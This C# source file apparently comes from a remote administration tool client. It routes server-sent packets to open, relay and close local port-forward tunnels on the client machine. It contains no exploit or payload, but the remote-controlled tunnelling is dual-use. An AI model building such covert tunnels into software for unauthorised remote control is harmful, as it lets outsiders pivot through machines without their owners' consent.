using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;
using xClient.Core.Packets;
using xClient.Core.PortForward.Local.Packets;

namespace xClient.Core.PortForward.Local
{
    public class LocalPortForwardCommandHandler
    {
        public static void HandleCommand(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (type == typeof(LocalPortForwardConnect))
            {
                client.CreateLocalPortForwardClient((LocalPortForwardConnect)packet);
            }
            else if (type == typeof(LocalPortForwardData))
            {
                LocalPortForwardData data = (LocalPortForwardData)packet;
                if (client != null)
                {
                    LocalPortForwardClient forwarder = client.GetLocalForwardCLientById(data.ClientId);
                    forwarder.SendToRemote(data.Data);
                }
            }
            else if (type == typeof(LocalPortForwardDisconnect))
            {
                LocalPortForwardDisconnect disconnectCommand = (LocalPortForwardDisconnect)packet;
                var forwardClient = client.GetLocalForwardCLientById(disconnectCommand.ClientId);
                if (forwardClient != null)
                {
                    forwardClient.Disconnect();
                }

            }
        }
    }
}
